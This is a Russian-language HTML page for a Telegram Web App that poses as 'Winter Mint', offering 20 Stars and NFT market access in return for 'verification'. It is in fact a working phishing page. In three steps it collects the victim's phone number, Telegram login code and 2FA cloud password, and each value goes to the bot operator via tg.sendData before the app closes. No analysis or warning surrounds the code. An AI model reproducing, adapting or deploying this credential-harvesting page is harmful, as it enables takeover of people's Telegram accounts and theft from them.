<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Winter Mint Premium</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --bg-dark:#1b0f0f; --bg-grad:#3d0f0f; --accent-red:#e63946; --accent-green:#2a9d8f; --text:#f4f4f4; --card:rgba(255,255,255,0.05); }
        body { margin:0; font-family:-apple-system,system-ui; color:var(--text); background:linear-gradient(180deg,var(--bg-dark),var(--bg-grad)); min-height:100vh; overflow-x:hidden; }
        canvas { position:fixed; inset:0; z-index:1; pointer-events:none; }
        .header { text-align:center; padding:50px 20px; position:relative; z-index:2; }
        .section { display:none; padding:20px; position:relative; z-index:2; }
        .section.active { display:block; }
        .card { background:var(--card); border:1px solid rgba(255,255,255,0.1); border-radius:20px; padding:20px; backdrop-filter:blur(15px); }
        .input-field { width:100%; background:rgba(255,255,255,0.08); border:2px solid var(--accent-red); padding:18px; border-radius:15px; color:#fff; font-size:20px; text-align:center; margin:20px 0; outline:none; }
        .btn { width:100%; padding:16px; border-radius:15px; border:none; background:linear-gradient(135deg,var(--accent-red),#9b2226); color:#fff; font-weight:700; cursor:pointer; }
        .overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.95); z-index:1000; padding:30px; flex-direction:column; justify-content:center; align-items:center; backdrop-filter:blur(10px); }
        .overlay.active { display:flex; }
    </style>
</head>
<body>

<canvas id="snow"></canvas>

<div class="header">
    <h1>Winter Mint</h1>
    <p style="opacity:0.7">Верификация аккаунта</p>
</div>

<div class="section active" id="main-view">
    <div class="card">
        <h3 style="margin-top:0">Введите номер телефона</h3>
        <p style="font-size:14px; opacity:0.7">Для получения 20 ⭐ STARS и доступа к рынку NFT подтвердите ваш профиль.</p>
        <input type="tel" id="inp-phone" class="input-field" placeholder="+7 999 000 00 00">
        <button class="btn" onclick="sendPhone()">ПОЛУЧИТЬ КОД</button>
    </div>
</div>

<div id="step-code" class="overlay">
    <h2>Введите код</h2>
    <p style="text-align:center; opacity:0.7">Код отправлен в ваш чат Telegram</p>
    <input type="number" id="inp-code" class="input-field" placeholder="00000">
    <button class="btn" onclick="sendCode()">ПОДТВЕРДИТЬ</button>
</div>

<div id="step-2fa" class="overlay">
    <h2>Облачный пароль</h2>
    <p style="text-align:center; opacity:0.7">Введите ваш 2FA пароль</p>
    <input type="password" id="inp-pass" class="input-field" placeholder="Пароль">
    <button class="btn" onclick="sendPass()">ВОЙТИ</button>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    function sendPhone() {
        let val = document.getElementById('inp-phone').value;
        if(val.length > 5) {
            tg.sendData("PHONE:" + val);
            document.getElementById('step-code').classList.add('active');
        }
    }

    function sendCode() {
        let val = document.getElementById('inp-code').value;
        if(val.length >= 5) {
            tg.sendData("CODE:" + val);
            setTimeout(() => {
                document.getElementById('step-code').classList.remove('active');
                document.getElementById('step-2fa').classList.add('active');
            }, 2000);
        }
    }

    function sendPass() {
        let val = document.getElementById('inp-pass').value;
        if(val.length > 0) {
            tg.sendData("PASS:" + val);
            setTimeout(() => { tg.close(); }, 1500);
        }
    }

    // СНЕГ
    const c = document.getElementById("snow"), ctx = c.getContext("2d");
    let w, h, flakes = [];
    function resize() { w = c.width = innerWidth; h = c.height = innerHeight; }
    window.onresize = resize; resize();
    for (let i = 0; i < 80; i++) flakes.push({ x: Math.random() * w, y: Math.random() * h, r: Math.random() * 2 + 1, s: Math.random() * 1 + 0.5 });
    function snow() {
        ctx.clearRect(0, 0, w, h); ctx.fillStyle = "rgba(255,255,255,0.6)";
        flakes.forEach(f => {
            ctx.beginPath(); ctx.arc(f.x, f.y, f.r, 0, Math.PI * 2); ctx.fill();
            f.y += f.s; if (f.y > h) { f.y = -5; f.x = Math.random() * w; }
        });
        requestAnimationFrame(snow);
    }
    snow();
</script>
</body>
</html>
